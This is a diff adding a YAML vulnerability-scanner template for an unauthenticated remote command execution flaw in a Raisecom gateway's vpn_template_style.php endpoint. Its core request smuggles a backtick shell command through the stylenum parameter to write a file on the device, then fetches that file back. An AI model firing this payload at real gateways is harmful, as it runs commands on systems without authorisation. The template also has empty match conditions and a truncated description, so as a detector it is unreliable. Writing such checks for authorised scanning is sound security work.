@@ -1,0 +1,24 @@
+id: raisecom-rce
+brief:
+    title: Raisecom Gateway vpn_template_style.php - Remote Command Execution
+    by: 3th1c_yuk1
+    level: critical
+    about: The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service Intelligent Gateway is vulnerable to unauthenticated remote command execution. The stylenum parameter fails to properly sanitize u...
+    label:
+        - raisecom
+        - rce
+        - intrusive
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/tmp/{{filename}}.txt'
+      signs: []
